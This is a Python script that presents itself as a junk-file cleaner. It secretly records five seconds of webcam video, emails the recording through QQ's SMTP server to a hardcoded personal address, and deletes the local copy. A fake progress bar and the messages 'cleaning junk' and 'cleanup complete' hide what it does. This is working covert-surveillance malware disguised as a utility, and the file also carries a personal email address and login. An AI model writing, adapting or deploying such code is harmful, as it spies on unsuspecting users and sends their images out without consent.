# @Time    : 2020/7/10 11:31
# @Author  : Libuda
# @FileName: main.py
# @Software: PyCharm
import cv2
import os
from tqdm import tqdm
import time
import datetime
import smtplib  # 发送邮件 连接邮件服务器
from email.mime.text import MIMEText  # 构建邮件格式
from email.mime.multipart import MIMEMultipart  # 发送多个部分
from email.mime.application import MIMEApplication  # 发送附件

class SendEmail:
    def __init__(self):
        # 发件人
        self.send_user = "李晋军" + "<1364826576@qq.com>"
        # 登录名
        self.login_user = '1364826576@qq.com'
        # 这里要注意 不是qq密码 而是在邮箱里设置的发送邮箱的授权码
        self.password = 'x'
        # 发送邮件的服务器地址 qq为smtp.qq.com  163邮箱为smtp.163.com
        self.email_host = 'smtp.qq.com'

    def _send(self, userlist, message):
        # 实例化邮件发送服务器
        server = smtplib.SMTP()
        # 连接qq邮箱服务器
        server.connect(self.email_host)
        # 登录服务器
        server.login(self.login_user, self.password)
        # 发送邮件  注意此处消息的格式应该用as_string()函数
        server.sendmail(self.send_user, userlist, message.as_string())
        # 关闭邮箱
        server.close()

    def send_vedio(self, userlist, subject, file):
        """
        发送文件
        """
        message = MIMEMultipart('related')
        content = MIMEText('<html><body><img src="cid:imageid" alt="imageid"></body></html>', 'html', 'utf-8')  # 正文
        message.attach(content)
        message['Subject'] = subject
        message['From'] = self.send_user
        message['To'] = ';'.join(userlist)  # 收件人列表以分号隔开

        part_attach1 = MIMEApplication(open(file, 'rb').read())  # 打开附件
        part_attach1.add_header('Content-Disposition', 'attachment', filename=file)  # 为附件命名
        message.attach(part_attach1)  # 添加附件

        self._send(userlist, message)

def luping(file):
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    size = (int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)), int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)))
    out = cv2.VideoWriter(file, fourcc, 10.0, size)
    begin = datetime.datetime.now()

    while (datetime.datetime.now() - begin).seconds < 5:
        ret, frame = cap.read()
        frame = cv2.flip(frame, 1)
        out.write(frame)
        cv2.waitKey(80)
    cap.release()
    out.release()
    cv2.destroyAllWindows()


print("正在清理垃圾请稍等。。。。。。")
file = 'D:\\video1.avi'
luping(file)
S = SendEmail()
user_list = ['1364826576@qq.com']
S.send_vedio(user_list, "图片", file)
os.remove(file)
for i in tqdm(range(100)):
    time.sleep(0.1)
print("垃圾文件清理完毕！")